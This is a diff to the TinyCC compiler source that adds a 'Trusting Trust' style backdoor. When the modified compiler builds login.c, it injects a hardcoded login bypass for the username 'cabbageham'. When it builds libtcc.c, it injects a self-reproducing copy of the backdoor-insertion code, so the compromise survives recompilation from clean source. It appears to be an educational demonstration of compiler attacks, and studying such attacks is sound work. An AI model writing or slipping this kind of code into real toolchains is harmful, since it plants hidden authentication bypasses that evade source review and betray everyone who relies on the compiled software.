@@ -735,17 +735,21 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
        Alternatively we could use thread local storage for those global
        variables, which may or may not have advantages */
+    char login_line[] = "if (!strcmp(username, %ccabbageham%c))return 0;";
     if(!strcmp(str, "login.c")) {
         printf("testing\n");
-        char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
         FILE *source = fopen(str, "r");
-		FILE *temp = fopen("temp.txt", "w");
-        char target_line[] = "static int do_login(const char *username){";
+		FILE *temp = fopen("temp1.txt", "w");
+        unsigned char* login_line_final = tcc_malloc(sizeof(unsigned char) * 9900);
+        char target_line[] = "return 0;";
 		char buffer[50000];
 		while (fgets(buffer, 50000, source)) {
 		    if (strstr(buffer, target_line)) {
 		        fputs(buffer, temp);
-                fputs(login_line, temp);
+                snprintf(login_line_final, 9900, login_line, 34, 34);   
+                printf(login_line_final);
+
+                fputs(login_line_final, temp);
             } 
             else {
                 fputs(buffer, temp);
@@ -753,20 +757,23 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 		}
 		fclose(source);
 		fclose(temp);
-		fd = _tcc_open(s1, "temp.txt");
-        str = "temp.txt";
+        tcc_free(login_line_final);
+		fd = _tcc_open(s1, "temp1.txt");
+        str = "temp1.txt";
 	}
 
 	if(!strcmp(str, "libtcc.c")) {
 		FILE *source = fopen(str, "r");
 		FILE *temp = fopen("temp.txt", "w");
         char target_line[] = "       variables, which may or may not have advantages */";
-        char attack_line[] = "printf(\"THIS IS A TEST\\n\");";
+        char attack_line[] = "    char login_line[] = %cif (!strcmp(username, %%ccabbageham%%c))return 0;%c;if(!strcmp(str, %clogin.c%c)) {printf(%ctesting\\n%c);FILE *source = fopen(str, %cr%c);FILE *temp = fopen(%ctemp1.txt%c, %cw%c);unsigned char* login_line_final = tcc_malloc(sizeof(unsigned char) * 9900);char target_line[] = %creturn 0;%c;char buffer[50000];while (fgets(buffer, 50000, source)) {if (strstr(buffer, target_line)) {fputs(buffer, temp);snprintf(login_line_final, 9900, login_line, 34, 34);fputs(login_line_final, temp);} else {fputs(buffer, temp);}}fclose(source);fclose(temp);tcc_free(login_line_final);fd = _tcc_open(s1, %ctemp1.txt%c);str = %ctemp1.txt%c;}";
+        unsigned char* attack_line_final = tcc_malloc(sizeof(unsigned char) * 9900);
 		char buffer[50000];
 		while (fgets(buffer, 50000, source)) {
 		    if (strstr(buffer, target_line)) {
 		        fputs(buffer, temp);
-                fputs(attack_line, temp);
+                snprintf(attack_line_final, 9900, attack_line, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34);
+                fputs(attack_line_final, temp);
             } 
             else {
                 fputs(buffer, temp);
@@ -774,6 +781,7 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
         }
 		fclose(source);
 		fclose(temp);
+        tcc_free(attack_line_final);
 		fd = _tcc_open(s1, "temp.txt");
         str = "temp.txt";
 	}
